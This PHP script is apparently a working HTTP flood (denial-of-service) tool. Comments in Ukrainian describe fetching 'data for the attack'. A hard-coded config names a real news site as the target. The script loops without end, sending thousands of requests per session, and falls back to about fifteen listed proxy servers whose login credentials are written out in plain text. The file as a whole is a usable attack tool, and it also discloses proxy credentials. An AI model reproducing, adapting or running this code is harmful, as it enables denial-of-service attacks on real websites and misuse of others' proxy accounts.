<?php

    $total = 0;
    $count = 0;

    $sessionMaxRequests = 5000;

    while (true) {
        try {
            // отримую дані для атаки
            echo "GET DATA \n";
            $count = 0;
            $data = @file_get_contents('dsadfadsfsd');
            $data = '{"site":{"id":31,"url":"https:\/\/ria.ru\/","need_parse_url":0,"page":"https:\/\/ria.ru\/","page_time":"30.00249","atack":1},"proxy":[{"id":3,"ip":"45.151.102.91:8000\r","auth":"k5wde6:Do5sMv"},{"id":4,"ip":"45.151.100.142:8000\r","auth":"k5wde6:Do5sMv"},{"id":22,"ip":"212.102.146.52:8000\r","auth":"k5wde6:Do5sMv"},{"id":40,"ip":"196.18.2.170:8000\r","auth":"k5wde6:Do5sMv"},{"id":42,"ip":"193.111.19.245:8000\r","auth":"k5wde6:Do5sMv"},{"id":46,"ip":"193.111.18.38:8000\r","auth":"k5wde6:Do5sMv"},{"id":47,"ip":"193.111.19.64:8000\r","auth":"k5wde6:Do5sMv"},{"id":58,"ip":"5.101.81.161:8000\r","auth":"btzhkA:Gcgt48"},{"id":61,"ip":"45.134.52.54:8000\r","auth":"btzhkA:Gcgt48"},{"id":62,"ip":"45.134.54.125:8000\r","auth":"btzhkA:Gcgt48"},{"id":70,"ip":"46.3.150.59:8000\r","auth":"0ShxVd:409mML"},{"id":83,"ip":"46.3.148.143:8000\r","auth":"0ShxVd:409mML"},{"id":84,"ip":"46.3.151.67:8000\r","auth":"0ShxVd:409mML"},{"id":93,"ip":"46.3.150.156:8000\r","auth":"0ShxVd:409mML"},{"id":102,"ip":"45.147.29.203:8000\r","auth":"HUZwbg:GuM1Ke"}]}';

            if(!$data){
                echo "Waiting...\n";
                sleep(5);
            }

            $data = json_decode($data, true);

            $code = request($data['site']['page']);

            if($code != 200){
                foreach ($data['proxy'] as $proxy) {
                    while (true){
                        request($data['site']['page'], $proxy['ip'], $proxy['auth']);
                        if($count > $sessionMaxRequests){
                            break;
                        }
                    }
                }
            }else{
                while (true){
                    request($data['site']['page']);
                    if($count > $sessionMaxRequests){
                        break;
                    }
                }
            }
        } catch (\Exception $e) {
            sleep(5);
        }

    }

    function request($url, $ip = false, $auth = false){
        global $total;
        global $count;

        $total++;
        $count++;

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
        if($ip) curl_setopt($curl, CURLOPT_PROXY, $ip);
        if($auth) curl_setopt($curl, CURLOPT_PROXYUSERPWD, $auth);

        curl_exec($curl);
        $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        echo $url . ' | HTTP code: ' . $httpcode . ($ip && $auth ? ' with proxy ' : '') . " | " . $total . " / " . $count . "\n";
        return $httpcode;
    }
